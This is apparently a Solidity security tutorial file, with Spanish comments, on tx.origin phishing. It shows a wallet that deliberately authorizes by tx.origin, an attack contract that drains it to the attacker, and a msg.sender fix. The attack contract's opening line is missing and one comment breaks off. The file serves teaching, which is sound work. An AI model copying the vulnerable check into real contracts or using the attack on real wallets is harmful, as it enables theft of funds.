/* Suplantación de identidad con tx.origin // Phishing with tx.origins
PARTIENDO DE LA BASE QUE : Si el contrato A llama a B y B llama a C, en C msg.sender es B y tx.origin es A.

RESUMEN: A --> B 
         B --> C MSG.SENDER = B, TX.ORIGIN = A. ( El tx.origin viene reflejado a partir del 

Vulnerabilidad
Un contrato malintencionado puede engañar al propietario de un contrato para que llame a una función que solo el propietario debería poder llamar.
*/
// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
/*
Wallet es un contrato simple en el que solo el propietario debe poder transferir
Éter a otra dirección. Wallet.transfer() usa tx.origin para verificar que el
la persona que llama es el propietario. Veamos cómo podemos hackear este contrato.
*/
/*
1. Alice implementa Wallet con 10 Ether
2. Eve implementa Attack con la dirección del contrato de la cartera de Alice.
3. Eve engaña a Alice para llamar Attack.attack()
4. Eve roba con éxito Ether de la billetera de Alice.

Alice fue engañada para llamar a Attack.attack(). Dentro de Attack.attack(),
solicitó una transferencia de todos los fondos en la billetera de Alice a la dirección de Eve.
Dado que tx.origin en Wallet.transfer() es igual a la dirección de Alice,
autorizó la transferencia. La billetera transfirió todo el éter a Eve.
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}

// TÉCNICAS PREVENTIVAS 
// Usar msg.sender en vez de tx.origin ya que el tx.origin no es una fuente fiable.

function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call{ value: _amount }("");
  require(sent, "Failed to send Ether");
}

